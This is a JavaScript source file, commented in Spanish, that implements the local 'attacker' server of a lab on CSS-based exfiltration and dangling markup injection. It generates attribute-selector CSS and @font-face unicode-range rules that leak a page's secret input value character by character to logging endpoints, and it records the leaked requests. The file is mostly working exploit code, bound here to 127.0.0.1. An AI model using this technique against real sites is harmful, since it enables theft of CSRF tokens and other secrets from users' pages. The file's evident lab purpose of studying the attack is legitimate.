'use strict';
// ============================================================================
// attacker.js — Endpoint "atacante" LOCAL del laboratorio CSS-exfil/DMI.
// Sirve el CSS malicioso (reglas de selectores de atributo) y registra cada
// petición que el navegador de la víctima hace hacia él (la exfiltración).
//
// Endpoints:
//   GET /css.css?round=N&prefix=P   → CSS con una regla por carácter candidato:
//         input[name="secret"][value^="P+c"] { background:url(//:8102/collect?round=N&char=c) }
//   GET /collect?round=N&char=C     → la víctima exfiltra el char C de la posición N
//   GET /dmi?<capturado>            → DMI: el HTML colgante llega aquí en la URL
//   GET /font.css                   → una regla @font-face por carácter candidato con
//         unicode-range:U+XXXX y src url(//8102/font?char=c). El navegador SOLO
//         descarga la fuente cuyo unicode-range cubre un carácter realmente
//         renderizado en el texto objetivo → cada petición /font delata un
//         carácter PRESENTE en el secreto (detección de presencia, 1 sola ronda).
//   GET /font?char=C                → la víctima renderizó el char C (está en el secreto)
//   GET /log                        → JSON con todo lo registrado (para el runner)
//
// 100% local (127.0.0.1). No toca nada externo ni en scope.
// ============================================================================
const http = require('http');

// Alfabeto de candidatos por posición: alfanumérico + guiones y punto (chars
// comunes en tokens/CSRF). En un ataque real se itera sobre el charset que se
// quiera; aquí cubre el secreto de demostración completo.
const ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.';
const log = [];

function generateCss(round, prefix) {
  const sel = 'input[name="secret"]';
  return ALPHABET.split('').map((c) => {
    const target = prefix + c;
    return `${sel}[value^="${target}"]{background:url(http://127.0.0.1:8102/collect?round=${round}&char=${encodeURIComponent(c)}&target=${encodeURIComponent(target)})}`;
  }).join('\n');
}

function generateFontCss() {
  // Una @font-face por candidato: misma font-family, distinto unicode-range.
  // El navegador compone el texto objetivo con la primera cara cuyo rango cubra
  // cada carácter; solo descarga las caras de caracteres realmente presentes.
  return ALPHABET.split('').map((c) => {
    const cp = c.codePointAt(0).toString(16).toUpperCase();
    return `@font-face{font-family:evilfont;src:url(http://127.0.0.1:8102/font?char=${encodeURIComponent(c)});unicode-range:U+${cp};}`;
  }).join('\n');
}

function start(port = 8102) {
  const srv = http.createServer((req, res) => {
    const u = new URL(req.url, 'http://127.0.0.1');
    const path = u.pathname;
    if (path === '/css.css') {
      const round = parseInt(u.searchParams.get('round') || '0', 10);
      const prefix = u.searchParams.get('prefix') || '';
      res.writeHead(200, { 'Content-Type': 'text/css' });
      res.end(generateCss(round, prefix));
      return;
    }
    if (path === '/font.css') {
      res.writeHead(200, { 'Content-Type': 'text/css' });
      res.end(generateFontCss());
      return;
    }
    if (path === '/collect' || path === '/dmi' || path === '/font') {
      log.push({
        t: Date.now(),
        path,
        query: u.search,
        params: Object.fromEntries(u.searchParams.entries()),
      });
      res.writeHead(204);
      res.end();
      return;
    }
    if (path === '/log') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(log));
      return;
    }
    res.writeHead(404);
    res.end('nf');
  });

  return new Promise((resolve) => {
    srv.listen(port, '127.0.0.1', () => resolve({ srv, log, base: `http://127.0.0.1:${port}` }));
  });
}

module.exports = { start, ALPHABET, generateCss };